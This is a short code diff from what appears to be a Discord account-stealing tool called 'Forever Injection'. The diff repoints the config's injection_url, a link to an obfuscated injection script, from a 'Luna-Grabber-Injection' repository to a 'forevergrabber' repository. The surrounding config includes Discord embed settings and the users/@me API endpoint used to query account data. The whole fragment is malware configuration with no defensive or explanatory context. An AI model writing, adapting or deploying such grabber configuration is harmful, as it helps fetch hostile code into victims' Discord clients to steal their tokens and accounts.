@@ -14,7 +14,7 @@ const config = {
     embed_name: 'Forever Injection',
     embed_icon: 'https://cdn.discordapp.com/attachments/1307542731987619881/1320920607042441339/6892622-discord-logo-icons-editorial-collection-gratis-vetor.jpg?ex=676b5aae&is=676a092e&hm=20542bc18c309b26c3407b12031eee17587307d1995010be529765cfb7015241&',
     embed_color: 34303,
-    injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js',
+    injection_url: 'https://raw.githubusercontent.com/nthwx/forevergrabber/main/injection-obfuscated.js',
     api: 'https://discord.com/api/v9/users/@me',
     nitro: {
         boost: {
